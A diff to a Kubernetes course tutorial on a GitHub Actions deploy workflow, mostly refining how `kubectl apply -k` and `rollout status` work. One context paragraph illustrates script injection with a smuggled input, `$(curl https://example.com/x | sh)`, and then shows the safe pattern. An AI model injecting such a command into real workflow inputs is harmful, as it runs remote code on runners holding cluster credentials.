@@ -345,7 +345,7 @@ GitHub shows **Run workflow** only for a workflow file on the default branch, `m
 
 The input is the dangerous part. GitHub pastes every `${{ }}` expression into the script text before bash reads it. Written as `run: echo ${{ inputs.sha }}`, an input of `$(curl https://example.com/x | sh)` runs as code on a runner that holds your kubeconfig. Through `env:`, the input stays a value in the variable `SHA`, and the regular expression accepts nothing but 40 lowercase hexadecimal characters. The step then writes a small **Kustomization**, the Kustomize file that lists manifests and changes to them, which reuses the prod overlay and swaps each image for its GHCR name and the SHA tag. Week 15 covers Kustomize.
 
-The last step applies the result. `kubectl rollout status` waits until each Deployment runs the new version, and fails the job after five minutes if one does not. The job turns red when a deploy fails, not only when `kubectl apply` fails.
+The last step applies the result. `kubectl apply -k` puts every object in the `your-monitor` namespace, which the base of Week 15 names. `kubectl rollout status` waits until each Deployment in that namespace runs the new version, and fails the job after five minutes if one does not. `--namespace` keeps the job independent of the namespace that the kubeconfig picks. `setup-kubectl` installs kubectl v1.36.5, the newest patch of Kubernetes 1.36, the version of the cluster in Weeks 15 to 18. The job turns red when a deploy fails, not only when `kubectl apply` fails.
 
 ### Step 10: Check the Workflows
 
